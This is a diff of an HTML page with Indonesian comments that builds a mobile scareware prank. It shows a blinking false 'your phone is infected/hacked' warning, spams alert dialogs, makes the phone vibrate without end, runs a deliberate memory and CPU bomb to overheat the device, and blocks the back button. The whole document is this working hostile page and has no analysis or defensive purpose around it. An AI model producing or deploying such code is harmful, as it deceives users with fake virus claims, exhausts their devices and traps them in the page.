@@ -1,19 +1,78 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hati-hati</title>
-</head>
-<body style="background: black; color: red; text-align: center; padding-top: 100px;">
-    <h1>HP ANDA TERINFEKSI!</h1>
-    
-    <script>
-        // Spam alert setiap kali dia mencoba menekan OK
-        let count = 0;
-        while (count < 50) { // Batasi 50 kali biar browser nggak crash
-            alert("⚠️ VIRUS TERDETEKSI ⚠️\n\nSilakan hubungi IT Support atau tutup paksa browser Anda.");
-            count++;
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sistem Error</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #ff0000;
+            text-align: center;
+            font-family: monospace;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
         }
+        h1 {
+            font-size: 30px;
+            margin-top: 20vh;
+            text-shadow: 0 0 10px red;
+            animation: blink 0.5s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <h1>⚠️ HP ANDA TERINFEKSI ⚠️</h1>
+    <p>Menghubungi server pusat...</p>
+
+    <script>
+        // --- 1. SPAM ALERT (Memblokir Layar) ---
+        // Kita pakai setTimeout agar tidak langsung membekukan browser sebelum halaman tampil
+        setTimeout(function() {
+            let count = 0;
+            let alertInterval = setInterval(function() {
+                if (count > 20) {
+                    clearInterval(alertInterval);
+                } else {
+                    alert("⚠️ SISTEM HACKED ⚠️\n\nKlik OK untuk membersihkan.");
+                    count++;
+                }
+            }, 100);
+        }, 500);
+
+        // --- 2. GETAR TANPA HENTI (Vibration API) ---
+        if ("vibrate" in navigator) {
+            // Pola getar: 1000ms nyala, 500ms mati, diulang terus
+            setInterval(function() {
+                navigator.vibrate([1000, 500, 1000, 500]);
+            }, 500);
+        }
+
+        // --- 3. MEMORI BOM & CPU BOMB (Membuat HP Panas) ---
+        setTimeout(function() {
+            let bomb = [];
+            let cpuBurn = function() {
+                // Loop terus menerus memakan CPU
+                for(let i=0; i<10000; i++) {
+                    Math.sqrt(i);
+                }
+                // Isi RAM terus menerus
+                bomb.push(new Array(10000).join("X"));
+                requestAnimationFrame(cpuBurn);
+            };
+            cpuBurn();
+        }, 1000);
+
+        // --- 4. MENCEGAH TOMBOL BACK DITEKAN ---
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
     </script>
 </body>
 </html>
